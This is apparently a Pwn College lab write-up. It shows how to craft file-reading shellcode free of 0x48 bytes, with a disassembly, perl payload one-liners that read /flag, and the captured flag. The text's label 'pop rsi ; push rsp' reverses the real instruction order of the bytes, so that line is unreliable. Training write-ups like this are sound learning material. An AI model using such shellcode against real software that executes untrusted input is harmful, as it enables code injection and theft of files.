---
Platform: Pwn College
Tittle: ello ackers!
Date & Tme: "2026 - 09 - 08 16:01"
tags:
  - Challenge
  - Shellcode-Crafting
  - Opcode-Filter
  - Instruction-Substitution
  - 32bit-in-64bit
---
---
## FLAG : `pwn.college{Ef3rjccqYzEsyOUSjXkpIs61xWe.dBjMywiN4kDOyEzW}`

---
## Solution :

File security : 
```shell
[*] '/challenge/ello-ackers'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Functions : 
```asm
0x0000000000001300  frame_dummy
0x0000000000001309  print_disassembly
0x0000000000001567  main
```

Program overview : 
```shell
hacker@program-security~ello-ackers:/challenge$ perl -e 'print "\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x66\x6c\x61\x67\x00"' | ./ello-ackers
###
### Welcome to ./ello-ackers!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x29e93000!
Reading 0x1000 bytes from stdin.

Executing filter...

This challenge requires that your shellcode have no H bytes!

Failed filter at byte 6!
```

It seems the program require us to insert a shellcode that doesn't contain H bytes (0x48). The shellcode we use is the same one with previous challenge shellcode.
Here is the break down : 

```shell
0000000000400080 <.text>:
  400080: eb 2f                 jmp    0x4000b1
  400082: 5f                    pop    rdi
  400083: 6a 02                 push   0x2
  400085: 58                    pop    rax
  400086: 48 31 f6              xor    rsi,rsi  #not allowed
  400089: 0f 05                 syscall
  40008b: 66 81 ec ef 0f        sub    sp,0xfef
  400090: 48 8d 34 24           lea    rsi,[rsp]  #not allowed
  400094: 48 97                 xchg   rdi,rax  #not allowed
  400096: 48 31 d2              xor    rdx,rdx  #not allowed
  400099: 66 ba ef 0f           mov    dx,0xfef
  40009d: 48 31 c0              xor    rax,rax  #not allowed
  4000a0: 0f 05                 syscall
  4000a2: 6a 01                 push   0x1
  4000a4: 5f                    pop    rdi
  4000a5: 48 92                 xchg   rdx,rax  #not allowed
  4000a7: 6a 01                 push   0x1
  4000a9: 58                    pop    rax
  4000aa: 0f 05                 syscall
  4000ac: 6a 3c                 push   0x3c
  4000ae: 58                    pop    rax
  4000af: 0f 05                 syscall
  4000b1: e8 cc ff ff ff        call   0x400082

```


> [!info] 0x48 bytes
> `0x48` is the **REX.W** prefix in x86-64 architecture. By default, most legacy integer instructions operate on 32-bit operands for backward compatibility and compact encoding. To execute these instructions using 64-bit operands on standard registers (`rax`–`rdi`), the assembler prepends the `0x48` prefix (binary `0100 1000b`, where bit **W = 1**) to signal the CPU to treat the operation as 64-bit.
> 
> However, when executing a 32-bit instruction without the prefix, the processor automatically zeroes out the upper 32 bits of the destination register. This allows us to clear registers or load small values smoothly without needing 64-bit operations, though it cannot be used when preserving or reading existing 64-bit pointers.

Based on the explanation above, we could just simply remove `0x48` bytes. But, we cannot simply strip `0x48` from memory pointer instructions like `lea rsi, [rsp]`. Dropping the prefix turns it into `lea esi, [rsp]`, which will corrupt the 64-bit stack pointer.

Alternatively, we will use `pop rsi ; push rsp` (0x54 0x5e). This instruction is similar to `lea rsi, [rsp]`.

If we remove the `0x48` bytes, the bytes placement will shifted, this could cause `segfault` on `jmp` instruction, so to prevent this, instead of removing the bytes, we change it into `NOP sled` bytes.

Here is the refined shellcode : 
```
\xeb\x2f\x5f\x6a\x02\x58\x90\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x54\x5e\x90\x90\x90\x97\x90\x31\xd2\x66\xba\xef\x0f\x90\x31\xc0\x0f\x05\x6a\x01\x5f\x90\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x66\x6c\x61\x67\x00
```

Payload : 
```shell
perl -e 'print "\xeb\x2f\x5f\x6a\x02\x58\x90\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x54\x5e\x90\x90\x90\x97\x90\x31\xd2\x66\xba\xef\x0f\x90\x31\xc0\x0f\x05\x6a\x01\x5f\x90\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x66\x6c\x61\x67\x00"' | ./ello-ackers
```

---
### Key Takeaways : 
- There are so much alternative shellcode. We should think out of the box to find them out.

---
## Related Concepts : 
[[Basic Shellcode]], [[NOP Sled]], [[Shellcode Database]], [[Assembly - Registers]], [[Assembly - Data Movement]], [[perl]]
